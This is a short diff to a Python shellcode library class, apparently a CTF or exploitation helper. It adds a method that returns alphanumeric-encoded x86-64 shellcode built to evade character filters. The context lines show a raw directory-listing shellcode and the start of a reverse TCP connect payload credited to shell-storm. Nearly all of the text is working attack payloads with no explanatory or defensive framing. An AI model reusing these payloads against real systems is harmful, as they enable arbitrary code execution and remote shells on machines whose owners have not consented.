@@ -27,6 +27,24 @@ class ShellcodeMall:
         ls_current_dir = b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"
 
         @staticmethod
+        def ascii_shellcode(reg="rax"):
+            __m = {
+                "rax": b"P",
+                "rbx": b"S",
+                "rcx": b"Q",
+                "rdx": b"R",
+                "rdi": b"W",
+                "rsi": b"V",
+                "rsp": b"T",
+                "rbp": b"U"
+            }
+            if reg not in __m:
+                print("only supported: ", __m.keys())
+                exit(1)
+            return __m[reg] + b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+
+
+        @staticmethod
         def reverse_tcp_connect(ip: str, port: int) -> bytes:
             # from http://shell-storm.org/shellcode/files/shellcode-907.php
             """
